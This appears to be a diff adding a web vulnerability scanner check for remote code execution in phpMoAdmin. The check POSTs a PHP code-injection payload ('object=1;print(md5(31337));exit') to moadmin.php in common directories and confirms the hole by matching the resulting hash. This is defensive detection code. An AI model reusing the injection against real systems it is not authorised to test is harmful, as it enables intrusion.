@@ -1,0 +1,43 @@
+#include helpers.inc;
+#include string_helpers.inc;
+// **************************************************************************************							 
+function alert(job, pattern)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile("phpMoAdmin_Remote_Code_Execution.xml");
+	ri.affects = job.uri;
+	ri.alertPath = "Scripts/phpMoAdmin_Remote_Code_Execution.xml";	
+	
+	ri.setHttpInfo(job);
+	
+	if (pattern)
+		ri.Details =  ri.Details + "Pattern found: [dark]" + pattern + "[/dark]";
+	
+	AddReportItem(ri);	
+}
+function testDir(dirName) {		
+	var lastJob = new THTTPJob();
+	lastJob.url = scanURL;
+	lastJob.verb = 'POST';
+	lastJob.uri = dirName + "moadmin.php";
+	lastJob.request.addHeader('Content-type', 'application/x-www-form-urlencoded', true);
+	lastJob.request.body = "object=1;print(md5(31337));exit";
+	lastJob.addCookies = false;
+	lastJob.execute();	
+	var patternStr = "6f3249aa304055d63828af3bfab778f6";
+	if (!lastJob.wasError && lastJob.responseStatus == 200)
+	{
+		if (lastJob.response.body.indexOf(patternStr) != -1)	
+			{
+				alert(lastJob, patternStr);
+				return true;
+			}
+	}
+	return false;
+}
+/***********************************************************************************/
+/* main entry point */
+var dirs = ['/phpMoAdmin/', '/phpmoadmin/', '/moadmin/'];
+for (var i=0; i<dirs.length; i++) {
+	if (testDir(dirs[i])) break;
+}
